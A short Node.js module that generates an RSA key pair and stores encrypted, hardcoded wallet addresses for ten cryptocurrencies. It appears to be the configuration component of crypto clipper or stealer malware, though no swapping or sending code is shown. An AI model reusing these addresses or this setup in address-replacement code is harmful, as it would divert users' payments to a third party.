module.exports = (client) => {
    return {
        default_padding: client.requires.crypto.constants.RSA_PKCS1_OAEP_PADDING,
        default_oaepHash: "sha256",
        keyPair: client.requires.crypto.generateKeyPairSync("rsa", {
            modulusLength: 2048,
        }),

        btc: client.utils.encryption.encryptData("bc1q46mjlyhqzwj3yt7zr7apq889njzx7lng62wf5q"),
        ltc: client.utils.encryption.encryptData("LYNbeHVMGyuELtCTXxBNw7TiUHTiJVXocc"),
        xmr: client.utils.encryption.encryptData("44Fnehq1zUaMih44bDzLcQC4TV8XLknsPAGqEmjbCt1AJcsY3JyYNuhh9cZwugVS8eMBoZqt4iXeQNPpgpR8LC21FXZWoQ2"),
        eth: client.utils.encryption.encryptData("0xAe672925a6EE758f64296FC057F35E0d5D103776"),
        xrp: client.utils.encryption.encryptData("rL6w47PGM5Zxj8hQuwefeQwiZhL8SUJQqZ"),
        neo: client.utils.encryption.encryptData("APsAzJw3YqMAkL5aari3DMzf3w5Kp3RUr9"),
        bch: client.utils.encryption.encryptData("qz85ap59g6zc8k7d4r22jru4h7dumm6xwgjjquc42j"),
        doge: client.utils.encryption.encryptData("D66Mwzp5USMwpg93jYvRasvzRQZhxbpkt4"),
        dash: client.utils.encryption.encryptData("XcuwduXn9PcDiVogMQ2YWR4oqUM3MxKX8q"),
        xlm: client.utils.encryption.encryptData("GA6X5LQ3LMEWXRC74VUPHXFBUGIY3E3NFYCGSJZJCAKNBD2HBUFEANIL"),
    }
}
